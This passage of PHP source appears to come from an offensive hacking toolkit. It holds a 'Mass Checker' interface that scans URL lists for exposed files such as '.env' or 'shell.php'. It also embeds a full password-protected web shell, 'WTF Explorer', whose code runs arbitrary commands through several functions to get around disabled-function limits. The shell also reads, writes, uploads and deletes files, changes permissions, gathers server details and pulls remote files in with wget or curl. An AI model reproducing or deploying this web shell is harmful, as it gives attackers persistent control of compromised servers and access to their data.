      <div class="tab" id="tab-checker" onclick="showTab('checker')">Mass Checker</div>
    </div>

    <div class="panel" id="panel-grabber">
      <h3>Domain Grabber</h3>
      <div class="small">Scans a local directory for folder names that look like domains.</div>
      <form method="GET" action="">
        <label for="path">Local Directory Path</label>
        <input type="text" name="path" class="input" value="<?php echo htmlspecialchars($baseInput); ?>" placeholder="<?php echo htmlspecialchars($defaultPath); ?>">
        <button type="submit" class="btn">Grab Domains</button>
      </form>
      
      <?php if (!empty($grabber_output)): ?>
      <label style="margin-top:15px;">Results</label>
      <textarea id="grabber-result" class="result" rows="10"><?php echo htmlspecialchars($grabber_output); ?></textarea>
      <div class="btn secondary" onclick="copyTxt('grabber-result')">Copy to Clipboard</div>
      <?php endif; ?>
    </div>

    <div class="panel" id="panel-ext">
      <h3>EXT Generator</h3>
      <div class="small">Replaces or appends text to each line from a list of URLs.</div>
      <form method="POST" action="">
        <input type="hidden" name="action" value="ext_generate">
        <div class="flex">
          <div class="col">
            <label for="urllist">URL List</label>
            <textarea name="urllist" placeholder="http://domain.com/file.txt..."><?php echo htmlspecialchars($_POST['urllist'] ?? ''); ?></textarea>
          </div>
          <div class="col">
            <label for="oldext">Old Extension (Optional)</label>
            <input type="text" name="oldext" class="input" placeholder=".txt" value="<?php echo htmlspecialchars($_POST['oldext'] ?? ''); ?>">
            <label for="newext">New Extension</label>
            <input type="text" name="newext" class="input" placeholder=".php" value="<?php echo htmlspecialchars($_POST['newext'] ?? ''); ?>">
            <button type="submit" class="btn">Generate</button>
            <?php if (file_exists('ext.txt') && filesize('ext.txt') > 0): ?>
              <a href="ext.txt" target="_blank" class="download" style="margin-left:10px;">Download ext.txt (<?php echo filesize('ext.txt'); ?> bytes)</a>
            <?php endif; ?>
          </div>
        </div>
      </form>
      
      <?php if (!empty($ext_output)): ?>
      <label style="margin-top:15px;">Results</label>
      <textarea id="ext-result" class="result" rows="10"><?php echo htmlspecialchars($ext_output); ?></textarea>
      <div class="btn secondary" onclick="copyTxt('ext-result')">Copy to Clipboard</div>
      <?php endif; ?>
    </div>

    <div class="panel" id="panel-checker">
      <h3>Mass Checker</h3>
      <div class="small">Checks a list of URLs for a specific path and keyword.</div>
      <form method="POST" action="">
        <input type="hidden" name="action" value="mass_check">
        <label>URL List</label>
        <textarea name="urls" rows="8" placeholder="Enter list of URLs, one per line..."><?php echo htmlspecialchars($_POST['urls'] ?? ''); ?></textarea>
        
        <div class="flex">
            <div class="col">
                <label>Path / File</label>
                <input name="ext" class="input" placeholder="Example: .env or shell.php" value="<?php echo htmlspecialchars($_POST['ext'] ?? ''); ?>">
            </div>
            <div class="col">
                <label>Keyword</label>
                <input name="keyword" class="input" placeholder="Keyword (optional, checks HTTP 200 if empty)" value="<?php echo htmlspecialchars($_POST['keyword'] ?? ''); ?>">
            </div>
            <div class="col">
                <label>Target Mode</label>
                <select name="target_mode" class="input">
                    <option value="root" <?php echo (($_POST['target_mode'] ?? 'root') == 'root') ? 'selected' : ''; ?>>Append to Domain Root</option>
                    <option value="path" <?php echo (($_POST['target_mode'] ?? '') == 'path') ? 'selected' : ''; ?>>Append to URL Path</option>
                </select>
            </div>
            <div class="col">
                <label>Scan Mode</label>
                <select name="mode" class="input">
                    <option value="normal" <?php echo (($_POST['mode'] ?? 'normal') == 'normal') ? 'selected' : ''; ?>>Normal Mode (Stable, Slower)</option>
                    <option value="fast" <?php echo (($_POST['mode'] ?? '') == 'fast') ? 'selected' : ''; ?>>Fast Mode (Super Fast, cURL)</option>
                </select>
            </div>
        </div>
        <button type="submit" class="btn">Scan Now</button>
      </form>

      <?php if (!empty($checker_output)): ?>
        
        <label style="margin-top:15px;">Live Scan Log</label>
        <div class="checker-result">
          <?php echo $checker_output; // This contains live HTML output ?>
        </div>
        
        <?php if (!empty($checker_found_list_string)): ?>
          <label style="margin-top:15px;">Found Results (List)</label>
          <textarea id="checker-result-list" class="result" rows="8"><?php echo htmlspecialchars($checker_found_list_string); ?></textarea>
          <div class="btn secondary" onclick="copyTxt('checker-result-list')">Copy to Clipboard</div>
        <?php endif; ?>

      <?php endif; ?>
    </div>
  </div> <div class="footer">
    0x6ick — Gaje Project v1.0
  </div>
</div>
</body>
</html>
PHP;
}
function wtfexp() {
    return <<<'PHP'
<?php
// Script Header: Start Session and Error Reporting
session_start();
@error_reporting(0);
@set_time_limit(0);

// --- AUTHENTICATION CONFIGURATION (CHANGE THE HASH!) ---
$valid_password_hash = '$2a$12$b4rbjQK.jp0vyOClL9M0j.TiVb1Pd3Ms4bPLjVzzGlKOF8UWl4n0S';

$zip_available = class_exists('ZipArchive');

// --- SESSION MANAGEMENT ---
if (isset($_GET['logout'])) {
    unset($_SESSION['gits_login']);
    session_destroy();
    header('Location: ?');
    exit;
}

if (!isset($_SESSION['gits_login'])) {
    if (isset($_POST['pass'])) {
        if (password_verify($_POST['pass'], $valid_password_hash)) {
            $_SESSION['gits_login'] = true;
            header("Location: ?");
            exit;
        } else {
            $login_error = true;
        }
    }
    
    // Login Form Display (Using the clean, final style)
    echo '<style>
        body {
            background: #0d1117; color: #c9d1d9; font-family: monospace;
            display: flex; justify-content: center; align-items: center;
            height: 100vh; flex-direction: column; margin: 0;
        }
        form {
            position: relative; background: #161b22;
            border: 1px solid #30363d;
            padding: 30px; width: 300px;
            box-shadow: 0 0 10px rgba(88, 166, 255, 0.1);
            border-radius: 5px; box-sizing: border-box; overflow: hidden;
        }
        form::before {
            content: ""; position: absolute; width: 20px; height: 20px;
            background: #58a6ff; border-radius: 50%;
            top: -10px; left: -10px;
            animation: move-dot 5s linear infinite;
        }
        @keyframes move-dot {
            0% { top: -10px; left: -10px; } 25% { top: -10px; left: 290px; }
            50% { top: 290px; left: 290px; } 75% { top: 290px; left: -10px; }
            100% { top: -10px; left: -10px; }
        }
        h1 { color: #c9d1d9; margin-bottom: 20px; font-weight: 400; text-align: center; }
        input {
            background: #0d1117; color: #c9d1d9;
            border: 1px solid #30363d; padding: 12px; margin-top: 15px;
            width: 100%; box-sizing: border-box; border-radius: 3px;
            transition: border-color 0.3s, box-shadow 0.3s;
        }
        input:focus { border-color: #58a6ff; box-shadow: 0 0 5px rgba(88, 166, 255, 0.3); outline: none; }
        input::placeholder { color: rgba(201, 209, 217, 0.4); }
        input[type=submit] {
            background: #58a6ff; color: #ffffff; font-weight: bold; cursor: pointer;
            border: 1px solid #58a6ff; margin-top: 20px; transition: background-color 0.3s, border-color 0.3s;
            border-radius: 4px;
        }
        input[type=submit]:hover { background: #1f6feb; border-color: #1f6feb; }
        .error { color: #f85149; margin-bottom: 15px; font-weight: bold; }
        .contact { margin-top: 15px; font-size: 0.9em; text-align: center; color: #c9d1d9; }
        .contact a { color: #58a6ff; text-decoration: none; }
        .contact a:hover { text-decoration: underline; }
    </style>';
    // --- Display H1 ---
    echo '<h1>You just do WTF</h1>';

    // --- Error handling ---
    if (isset($login_error)) {
        echo '<div class="error">❌ Damn, suck it all…</div>';
        // Forgot/extra message + Telegram link
        echo '<div class="contact">Are we fucked or what? <a href="https://t.me/yungx6ick" target="_blank">@yungx6ick</a></div>';
    }

    // --- Login Form ---
    echo '<form method="POST">
    <input type="password" name="pass" placeholder="Enter Password">
    <input type="submit" value="Login">
    </form>';

    exit;
}

// File Download Handler
if (isset($_GET['download'])) {
    $filePath = realpath($_GET['download']);
    if ($filePath && is_file($filePath) && is_readable($filePath)) {
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($filePath).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($filePath));
    readfile($filePath);
    exit;
    } else {
        http_response_code(404);
        exit('File not found or not readable.');
    }
}

// Get current directory path
function get_path() { $path = isset($_REQUEST['d']) ? $_REQUEST['d'] : getcwd(); return realpath($path) ? realpath($path) : getcwd(); }
// Format file permissions
function get_perms($file){ 
    $perms = @fileperms($file); 
    if ($perms === false) return '????'; 
    $info = (($perms & 0xC000) == 0xC000) ? 's' : ((($perms & 0xA000) == 0xA000) ? 'l' : ((($perms & 0x8000) == 0x8000) ? '-' : ((($perms & 0x6000) == 0x6000) ? 'b' : ((($perms & 0x4000) == 0x4000) ? 'd' : ((($perms & 0x2000) == 0x2000) ? 'c' : ((($perms & 0x1000) == 0x1000) ? 'p' : 'u')))))); 
    $info .= (($perms & 0x0100) ? 'r' : '-'); $info .= (($perms & 0x0080) ? 'w' : '-'); $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-')); 
    $info .= (($perms & 0x0020) ? 'r' : '-'); $info .= (($perms & 0x0010) ? 'w' : '-'); $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-')); 
    $info .= (($perms & 0x0004) ? 'r' : '-'); $info .= (($perms & 0x0002) ? 'w' : '-'); $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-')); 
    return $info; 
}
// Format file size
function format_size($size) { $units = ['B', 'KB', 'MB', 'GB', 'TB']; for ($i = 0; $size > 1024; $i++) { $size /= 1024; } return round($size, 2) . ' ' . $units[$i]; }
// Delete file or folder recursively
function delete_recursive($target) { if (!file_exists($target)) return true; if (!is_dir($target)) return unlink($target); foreach (scandir($target) as $item) { if ($item == '.' || $item == '..') continue; if (!delete_recursive($target . DIRECTORY_SEPARATOR . $item)) return false; } return rmdir($target); }
// Command execution bypass attempts
function exe_bypass($cmd) {
    $disabled = @ini_get('disable_functions');
    $disabled_array = $disabled ? array_map('trim', explode(',', $disabled)) : [];
    $output = '';

    if (function_exists('shell_exec') && !in_array('shell_exec', $disabled_array)) {
        $output = shell_exec($cmd . ' 2>&1');
        if ($output !== null) return $output ?: 'Command executed successfully with no output.'; }
    if (function_exists('passthru') && !in_array('passthru', $disabled_array)) {
        ob_start(); passthru($cmd . ' 2>&1'); $output = ob_get_clean();
        if ($output !== false) return $output ?: 'Command executed successfully with no output.'; }
    if (function_exists('system') && !in_array('system', $disabled_array)) {
        ob_start(); system($cmd . ' 2>&1'); $output = ob_get_clean();
        if ($output !== false) return $output ?: 'Command executed successfully with no output.'; }
    if (function_exists('exec') && !in_array('exec', $disabled_array)) {
        exec($cmd . ' 2>&1', $lines);
        return implode("\n", $lines) ?: 'Command executed successfully with no output.'; }
    if (function_exists('popen') && !in_array('popen', $disabled_array)) {
        $handle = popen($cmd . ' 2>&1', 'r');
        if ($handle) {
            while (!feof($handle)) { $output .= fread($handle, 1024); }
            pclose($handle);
            return $output ?: 'Command executed successfully with no output.'; }
    }
    return "ERROR: All tested execution methods are disabled or failed.\nDisabled functions: " . ($disabled ?: 'None');
}

// Function to handle bulk zipping 
function zip_items($targets, $zipFileName) {
    global $zip_available;
    if (!$zip_available) return ['status'=>'error','message'=>'PHP ZipArchive not enabled.'];

    $zip = new ZipArchive();
    if ($zip->open($zipFileName, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== TRUE) {
        return ['status'=>'error','message'=>'Cannot create zip file.'];
    }

    foreach ($targets as $item) {
        if (is_file($item)) {
            $zip->addFile($item, basename($item));
        } elseif (is_dir($item)) {
            // Simplified directory recursion for example
            $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($item));
            foreach ($files as $file) {
                if (!$file->isDir()) {
                    $filePath = $file->getRealPath();
                    $relativePath = substr($filePath, strlen($item)+1);
                    $zip->addFile($filePath, $relativePath);
                }
            }
        }
    }

    $zip->close();
    return ['status'=>'ok','message'=>"Files zipped into ".basename($zipFileName)];
}

// Function to handle unzip action
function unzip_item($target, $path) {
    global $zip_available;
    if (!$zip_available) return ['status' => 'error', 'message' => 'ZipArchive extension is not enabled. Cannot unzip.'];
    
    $zip = new ZipArchive;
    if ($zip->open($target) === TRUE) {
        $extract_path = $path; // Extract to current directory
        if ($zip->extractTo($extract_path)) {
            $zip->close();
            return ['status' => 'ok', 'message' => 'File unzipped successfully!'];
        } else {
            $zip->close();
            return ['status' => 'error', 'message' => 'Failed to extract files. Check directory permissions.'];
        }
    } else {
        return ['status' => 'error', 'message' => 'Failed to open zip file.'];
    }
}


// --- AJAX API BLOCK ---
if (isset($_GET['ajax'])) {
    header('Content-Type: application/json');
    $path = get_path();
    $action = isset($_GET['action']) ? $_GET['action'] : 'list';
    $response = ['status' => 'error', 'message' => 'Unknown action'];

    switch ($action) {
        case 'list':
            $folders = []; $files = [];
            if (is_readable($path)) {
                $items = @scandir($path);
                if ($items) {
                    usort($items, function($a, $b) use ($path) {
                        $a_is_dir = is_dir($path . DIRECTORY_SEPARATOR . $a);
                        $b_is_dir = is_dir($path . DIRECTORY_SEPARATOR . $b);
                        if ($a_is_dir && !$b_is_dir) return -1;
                        if (!$a_is_dir && $b_is_dir) return 1;
                        return strcasecmp($a, $b);
                    });
                    foreach ($items as $item) {
                        if ($item == '.') continue;
                        $full_path = $path . DIRECTORY_SEPARATOR . $item;
                        if ($item == '..') {
                            $folders[] = ['name' => '..', 'path' => dirname($path)];
                            continue;
                        }
                        $is_dir = is_dir($full_path);
                        $entry = ['name' => htmlspecialchars($item), 'path' => htmlspecialchars($full_path)];
                        if ($is_dir) {
                            $folders[] = $entry;
                        } else {
                            $entry['size'] = format_size(@filesize($full_path));
                            $entry['perms'] = get_perms($full_path);
                            $entry['mtime'] = date("Y-m-d H:i:s", @filemtime($full_path));
                            $entry['is_writable'] = is_writable($full_path);
                            $entry['is_zip'] = (strtolower(pathinfo($item, PATHINFO_EXTENSION)) === 'zip'); 
                            $files[] = $entry;
                        }
                    }
                }
            }
            $response = ['status' => 'ok', 'path' => htmlspecialchars($path), 'folders' => $folders, 'files' => $files];
            break;

        case 'unzip': 
            $target = isset($_POST['target']) ? $_POST['target'] : '';
            $result = unzip_item($target, $path);
            $response = $result;
            break;
            
        case 'cmd': $cmd = isset($_POST['cmd']) ? $_POST['cmd'] : ''; $output = exe_bypass($cmd); $response = ['status' => 'ok', 'output' => htmlspecialchars($output)]; break;
        case 'delete': $target = isset($_POST['target']) ? $_POST['target'] : ''; if (file_exists($target)) { if (delete_recursive($target)) $response = ['status' => 'ok', 'message' => 'Item deleted!']; else $response = ['status' => 'error', 'message' => 'Failed to delete item!']; } else $response = ['status' => 'error', 'message' => 'Item not found!']; break;
        case 'get_content': $file = isset($_GET['file']) ? $_GET['file'] : ''; if (is_file($file) && is_readable($file)) { $response = ['status' => 'ok', 'content' => file_get_contents($file)]; } else $response = ['status' => 'error', 'message' => 'File not readable.']; break;
        case 'save_content': $file = isset($_POST['file']) ? $_POST['file'] : ''; $content = isset($_POST['content']) ? $_POST['content'] : ''; if ((file_exists($file) && is_writable($file)) || (!file_exists($file) && is_writable(dirname($file)))) { if (file_put_contents($file, $content) !== false) { $response = ['status' => 'ok', 'message' => 'File saved successfully!']; } else { $response = ['status' => 'error', 'message' => 'Failed to save file!']; } } else { $response = ['status' => 'error', 'message' => 'File or directory not writable.']; } break;
        case 'chmod': $target = isset($_POST['target']) ? $_POST['target'] : ''; $mode = isset($_POST['mode']) ? octdec($_POST['mode']) : 0755; if (file_exists($target)) { if (@chmod($target, $mode)) $response = ['status' => 'ok', 'message' => 'Permissions changed!']; else $response = ['status' => 'error', 'message' => 'Failed to change permissions.']; } else $response = ['status' => 'error', 'message' => 'Target not found.']; break;
        case 'rename': $old = isset($_POST['old']) ? $_POST['old'] : ''; $new = isset($_POST['new']) ? dirname($old) . DIRECTORY_SEPARATOR . $_POST['new'] : ''; if (file_exists($old) && $new) { if (@rename($old, $new)) $response = ['status' => 'ok', 'message' => 'Item renamed successfully!']; else $response = ['status' => 'error', 'message' => 'Failed to rename item.']; } else $response = ['status' => 'error', 'message' => 'Invalid input.']; break;
        case 'create': $type = isset($_POST['type']) ? $_POST['type'] : ''; $name = isset($_POST['name']) ? $_POST['name'] : ''; $target_path = $path . DIRECTORY_SEPARATOR . $name; if ($type && $name) { if (file_exists($target_path)) { $response = ['status' => 'error', 'message' => 'Name already exists!']; } else { if ($type === 'file' && @touch($target_path)) { $response = ['status' => 'ok', 'message' => 'File created successfully!']; } elseif ($type === 'dir' && @mkdir($target_path)) { $response = ['status' => 'ok', 'message' => 'Directory created successfully!']; } else $response = ['status' => 'error', 'message' => 'Failed to create, check permissions.']; } } else { $response = ['status' => 'error', 'message' => 'Invalid input.']; } break;
        case 'upload_multiple': $results = []; $totalFiles = count($_FILES['files']['name']); for ($i = 0; $i < $totalFiles; $i++) { if ($_FILES['files']['error'][$i] === UPLOAD_ERR_OK) { $uploadPath = $path . DIRECTORY_SEPARATOR . basename($_FILES['files']['name'][$i]); if (move_uploaded_file($_FILES['files']['tmp_name'][$i], $uploadPath)) { $results[] = ['name' => $_FILES['files']['name'][$i], 'status' => 'ok']; } else { $results[] = ['name' => $_FILES['files']['name'][$i], 'status' => 'error']; } } else { $results[] = ['name' => $_FILES['files']['name'][$i], 'status' => 'error']; } } $response = ['status' => 'ok', 'results' => $results, 'message' => "Uploaded $totalFiles files"]; break;
        case 'bulk_delete': $targets = isset($_POST['targets']) ? json_decode($_POST['targets'], true) : []; $deletedCount = 0; $failed = []; foreach ($targets as $target) { if (delete_recursive($target)) { $deletedCount++; } else { $failed[] = basename($target); } } if ($deletedCount > 0) { $msg = "Successfully deleted $deletedCount item(s)."; if (!empty($failed)) $msg .= " Failed to delete: " . implode(', ', $failed); $response = ['status' => 'ok', 'message' => $msg]; } else { $response = ['status' => 'error', 'message' => 'No items were deleted.']; } break;
        case 'bulk_zip': $targets = isset($_POST['targets']) ? json_decode($_POST['targets'], true) : []; $zipName = isset($_POST['zip_name']) ? $_POST['zip_name'] : 'archive_' . time() . '.zip'; $zipPath = $path . DIRECTORY_SEPARATOR . basename($zipName); $result = zip_items($targets, $zipPath); $response = $result; break;
        case 'get_server_info': $total_space = @disk_total_space(get_path()); $free_space = @disk_free_space(get_path()); $response = [ 'status' => 'ok', 'os' => php_uname(), 'php_version' => PHP_VERSION, 'user' => get_current_user(), 'server_ip' => @$_SERVER['SERVER_ADDR'], 'disabled_functions' => ini_get('disable_functions') ?: 'None', 'total_space' => $total_space ? format_size($total_space) : 'N/A', 'free_space' => $free_space ? format_size($free_space) : 'N/A' ]; break;
        case 'upload_wget': $url = isset($_POST['url']) ? $_POST['url'] : ''; $filename = isset($_POST['filename']) && !empty($_POST['filename']) ? $_POST['filename'] : basename($url); $target_path = $path . DIRECTORY_SEPARATOR . $filename; $cmd = "wget -O " . escapeshellarg($target_path) . " " . escapeshellarg($url); $output = exe_bypass($cmd); if (file_exists($target_path) && filesize($target_path) > 0) { $response = ['status' => 'ok', 'message' => "File downloaded via wget!\nOutput:\n$output"]; } else { @unlink($target_path); $response = ['status' => 'error', 'message' => "Failed to download file.\nOutput:\n$output"]; } break;
        case 'upload_curl': $url = isset($_POST['url']) ? $_POST['url'] : ''; $filename = isset($_POST['filename']) && !empty($_POST['filename']) ? $_POST['filename'] : basename($url); $target_path = $path . DIRECTORY_SEPARATOR . $filename; $cmd = "curl -L -o " . escapeshellarg($target_path) . " " . escapeshellarg($url); $output = exe_bypass($cmd); if (file_exists($target_path) && filesize($target_path) > 0) { $response = ['status' => 'ok', 'message' => "File downloaded via curl!\nOutput:\n$output"]; } else { @unlink($target_path); $response = ['status' => 'error', 'message' => "Failed to download file.\nOutput:\n$output"]; } break;
        case 'upload_raw': $filename = isset($_POST['filename']) ? $_POST['filename'] : ''; $content = isset($_POST['content']) ? $_POST['content'] : ''; $target_path = $path . DIRECTORY_SEPARATOR . $filename; if (empty($filename)) { $response = ['status' => 'error', 'message' => 'Filename cannot be empty!']; break; } if ((file_exists($target_path) && is_writable($target_path)) || (!file_exists($target_path) && is_writable($path))) { if (file_put_contents($target_path, $content) !== false) { $response = ['status' => 'ok', 'message' => 'Raw file created successfully!']; } else { $response = ['status' => 'error', 'message' => 'Failed to save file!']; } } else { $response = ['status' => 'error', 'message' => 'File or directory not writable.']; } break;
        default: $response = ['status' => 'error', 'message' => 'Invalid action!']; break;
    }
    
    echo json_encode($response);
    exit();
}
?>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WTF Explorer - 6ickZone</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;700&display=swap" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" rel="stylesheet">
    <style>
    :root { 
        /* --- Theme--- */
        --bg: #0d1117; 
        --sidebar-bg: #161b22; 
        --text: #c9d1d9; 
        --muted: #8b949e; 
        --border: #30363d; 
        --accent: #58a6ff; 
        --hover: #1f6feb; 
        --success: #2da44e; 
        --error: #f85149; 
        --font: 'Roboto Mono', monospace; 
    }

    /* --- BASE STYLES --- */
    body { 
        font-family: var(--font); 
        background: var(--bg); 
        color: var(--text); 
        margin: 0; 
        font-size: 14px; 
    }
    
    a { 
        color: var(--accent); 
        text-decoration: none; 
    }
    
    a:hover { 
        color: var(--hover); 
    }

    /* Styling tombol default (ini yang perlu di-override) */
    button, .button { 
        background: var(--accent); 
        border: black; 
        padding: 8px 15px; 
        cursor: pointer; 
        color: #fff; 
        font-weight: bold; 
        border-radius: 4px; 
    }
    
    button:hover, .button:hover { 
        background: var(--hover); 
    }

    /* --- LAYOUT & STRUCTURE --- */
    .container { 
        display: flex; 
        height: 100vh; 
    }
    
    .main-content { 
        flex-grow: 1; 
        display: flex; 
        flex-direction: column; 
    }

    /* --- SIDEBAR --- */
    .sidebar { 
        width: 25%; 
        max-width: 350px; 
        min-width: 250px; 
        background: var(--sidebar-bg); 
        border-right: 1px solid var(--border); 
        display: flex; 
        flex-direction: column; 
    }
    
    .sidebar-header { 
        padding: 15px; 
        border-bottom: 1px solid var(--border); 
        overflow-y: auto; 
    }
    
    .sidebar-content { 
        padding: 15px; 
        overflow-y: auto; 
        flex-grow: 1; 
        border-bottom: 1px solid var(--border); 
    }
    
    .sidebar-footer { 
        padding: 15px; 
        overflow-y: auto; 
        max-height: 250px; 
    }

    /* Folder List */
    .folder-list a { 
        display: block; 
        padding: 8px; 
        border-radius: 4px; 
        margin-bottom: 2px; 
        white-space: nowrap; 
        overflow: hidden; 
        text-overflow: ellipsis; 
    }
    
    .folder-list a:hover { 
        background: var(--border); 
    }

    /* Upload Zone */
    .upload-zone { 
        border: 2px dashed var(--border); 
        border-radius: 8px; 
        padding: 30px; 
        text-align: center; 
        margin-bottom: 15px; 
        cursor: pointer; 
        transition: all 0.3s; 
    }
    
    .upload-zone:hover { 
        border-color: var(--accent); 
        background: rgba(88, 166, 255, 0.05); 
    }
    
    .system-info { 
        background: var(--bg); 
        padding: 10px; 
        border-radius: 5px; 
        margin-top: 20px; 
        max-height: 200px; 
        overflow-y: auto; 
        font-size: 14px; 
        line-height: 1.4; 
    }

    /* --- TOP BAR (Path & CMD) --- */
    .top-bar { 
        display: flex; 
        align-items: center; 
        padding: 10px 15px; 
        background: var(--sidebar-bg); 
        border-bottom: 1px solid var(--border); 
    }
    
    /* Path Actions (Refresh, dll.) */
    .path-actions button { 
        background: none; 
        border: 1px solid var(--border); 
        color: var(--text); 
        padding: 5px 10px; 
        margin-right: 5px; 
        cursor: pointer; 
        border-radius: 4px; 
    }
    
    .path-actions button:hover { 
        background: var(--border); 
        color: var(--accent); 
    }
    
    /* Path Bar */
    .path-bar-container { 
        flex-grow: 1; 
        background: var(--bg); 
        border: 1px solid var(--border); 
        border-radius: 4px; 
        padding: 5px 10px; 
        cursor: text; 
    }
    
    .path-bar { 
        white-space: nowrap; 
        overflow-x: auto; 
    }
    
    .path-bar.hidden, #path-input.hidden { 
        display: none; 
    }
    
    #path-input { 
        width: 100%; 
        background: transparent; 
        border: none; 
        color: var(--text); 
        padding: 0; 
        margin: 0; 
        font-size: 1em; 
        font-family: var(--font); 
    }
    
    .path-part { 
        color: var(--accent); 
        cursor: pointer; 
    }
    
    .path-part:hover { 
        color: var(--hover); 
    }
    
    .path-sep { 
        margin: 0 5px; 
        color: var(--muted); 
    }
    
    /* CMD Execution */
    .cmd-container { 
        padding: 15px; 
        background: var(--sidebar-bg); 
        border-bottom: 1px solid var(--border); 
    }
    
    #cmd-form { 
        display: flex; 
        gap: 10px; 
    }
    
    #cmd-input { 
        flex-grow: 1; 
    }
    
    #cmd-output { 
        margin-top: 10px; 
        background: var(--bg); 
        padding: 10px; 
        border-radius: 4px; 
        max-height: 25vh; 
        overflow-y: auto; 
        white-space: pre-wrap; 
        word-wrap: break-word; 
    }

    /* --- FILE LIST & TABLE --- */
    .file-list-container { 
        overflow-y: auto; 
        flex-grow: 1; 
    }
    
    .file-table { 
        width: 100%; 
        border-collapse: collapse; 
    }
    
    .file-table th, .file-table td { 
        padding: 10px 15px; 
        text-align: left; 
        border-bottom: 1px solid var(--border); 
    }
    
    .file-table th { 
        font-weight: 700; 
        color: var(--muted); 
    }
    
    .file-table tr:hover { 
        background: rgba(88, 166, 255, 0.1); 
    }

    /* ICONS & PERMISSIONS */
    .fa-solid.fa-folder, .fa-solid.fa-arrow-up { 
        color: #58a6ff; 
        margin-right: 8px; 
    } 
    
    .fa-regular.fa-file-lines { 
        color: #8b949e; 
        margin-right: 8px;
    }
    
    .fa-solid.fa-file-zipper { 
        color: #f1c40f; 
        margin-right: 8px;
    } 

    .perms.writable { 
        color: var(--success); 
    } 
    
    .perms.not-writable { 
        color: var(--error); 
    }

    /* INPUTS & MODALS */
    .modal-overlay { 
        position: fixed; 
        top: 0; 
        left: 0; 
        width: 100%; 
        height: 100%; 
        background: rgba(0,0,0,0.7); 
        display: none; 
        justify-content: center; 
        align-items: center; 
        z-index: 1000; 
    }
    
    .modal-content { 
        background: var(--sidebar-bg); 
        padding: 20px; 
        border-radius: 5px; 
        border: 1px solid var(--border); 
        min-width: 50vw; 
        max-width: 80vw; 
    }
    
    .modal-content h3 { 
        margin-top: 0; 
    }
    
    textarea { 
        width: 100%; 
        height: 40vh; 
        background: var(--bg); 
        color: var(--text); 
        border: 1px solid var(--border); 
        font-family: var(--font); 
        box-sizing: border-box; 
    }
    
    input[type=text], input[type=file] { 
        background: var(--bg); 
        border: 1px solid var(--border); 
        color: var(--text); 
        padding: 8px; 
        border-radius: 4px; 
        box-sizing: border-box; 
    }
    
    /* TOAST NOTIFICATION */
    .toast-notification { 
        position: fixed; 
        bottom: 20px; 
        left: 50%; 
        transform: translateX(-50%); 
        padding: 10px 20px; 
        border-radius: 5px; 
        color: #fff; 
        font-weight: bold; 
        z-index: 2000; 
        opacity: 0; 
        transition: opacity 0.5s, bottom 0.5s; 
    }
    
    .toast-notification.show { 
        opacity: 1; 
        bottom: 40px; 
    }
    
    .toast-notification.success { 
        background: var(--success); 
    }
    
    .toast-notification.error { 
        background: var(--error); 
    }

    /* --- CUSTOM: BULK ACTIONS & ACTIONS MENU (Header) --- */
    .bulk-actions { 
        background: none !important; 
        border: none !important;
        padding: 10px 15px 10px 15px !important;
    }
    
    .bulk-actions input[type=checkbox] { 
        width: auto; 
        margin: 0; 
        vertical-align: middle; 
    }
    
    .bulk-actions button {
        background: none !important; 
        border: 1px solid var(--border); 
        color: var(--text) !important; 
        font-weight: normal; 
        padding: 5px 10px; 
        border-radius: 4px;
        transition: all 0.2s;
    }
    
    /* Bulk Delete */
    #bulk-delete-btn { 
        border-color: var(--error); 
        color: var(--error) !important; 
    }
    
    #bulk-delete-btn:hover { 
        background: rgba(248, 81, 73, 0.1) !important; 
    }
    
    /* Bulk Zip */
    #bulk-zip-btn { 
        border-color: var(--success); 
        color: var(--success) !important; 
    }
    
    #bulk-zip-btn:hover { 
        background: rgba(45, 164, 78, 0.1) !important; 
    }

    /* ACTIONS MENU (Sidebar) */
    .actions-menu button, 
    .actions-menu a { 
        background: none !important;
        border: none !important;
        color: var(--text);
        padding: 0;
        margin: 0 5px; 
        font-size: 1em;
        cursor: pointer;
        text-decoration: none;
        outline: none;
    }

    .actions-menu button:hover, 
    .actions-menu a:hover {
        color: var(--accent); 
        background: none !important; 
    }
    
    .file-table td.actions-menu button,
    .file-table td.actions-menu a {
        background: none !important; 
        border: none !important;
        
        color: var(--muted) !important; 
        
        padding: 0 4px !important; 
        margin: 0;
        
        font-weight: normal !important; 
        
        transition: color 0.2s, text-shadow 0.2s;
    }

    .file-table td.actions-menu button:hover,
    .file-table td.actions-menu a:hover,
    .file-table td.actions-menu button:focus,
    .file-table td.actions-menu a:focus {
        color: var(--accent) !important;
        /* Calm Glow Effect */
        text-shadow: 0 0 5px rgba(88, 166, 255, 0.7); 
        background: none !important;
    }

    /* Custom warna untuk Delete (X) */
    .file-table td.actions-menu button[title="Delete"] {
        color: var(--error) !important;
    }

    /* Custom warna dan glow untuk Delete saat hover */
    .file-table td.actions-menu button[title="Delete"]:hover {
        color: #ff9999 !important; 
        text-shadow: 0 0 5px rgba(248, 81, 73, 0.7);
    }
    
    /* --- MOBILE RESPONSIVENESS --- */
    @media (max-width: 768px) {
        .container { 
            flex-direction: column; 
        }
        
        .sidebar { 
            width: 100%; 
            max-width: none; 
            min-width: 100%; 
            border-right: none; 
            border-bottom: 1px solid var(--border); 
        }
        
        .top-bar { 
            flex-wrap: wrap; 
        }
        
        .path-actions { 
            order: 2; 
            margin-top: 10px; 
            width: 100%; 
        }
        
        .path-bar-container { 
            order: 1; 
        }
        
        .file-table thead { 
            display: none; 
        }
        
        .file-table td { 
            display: block; 
            text-align: right; 
            padding-left: 10px; 
        }
        
        .file-table td:before { 
            content: attr(data-label); 
            float: left; 
            font-weight: bold; 
            color: var(--muted); 
        }
        
        .file-table tr { 
            display: block; 
            margin-bottom: 10px; 
